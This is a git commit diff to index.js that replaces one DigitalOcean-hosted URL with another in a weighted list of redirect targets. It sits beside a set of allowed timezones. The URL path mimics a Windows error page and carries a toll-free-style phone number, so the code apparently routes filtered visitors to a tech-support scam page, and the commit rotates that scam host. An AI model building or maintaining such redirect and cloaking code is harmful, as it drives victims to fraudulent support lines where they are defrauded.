700b20cfaf5cd3d96c3f1f41c79b44735e21c309
paalakash <palaksh452@gmail.com>
2026-06-05 11:42:10 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-prawn-app-zonra.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-3066", weight: 1.0 }
+    { url: "https://stingray-app-nin95.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-3066", weight: 1.0 }
 
 ];
 
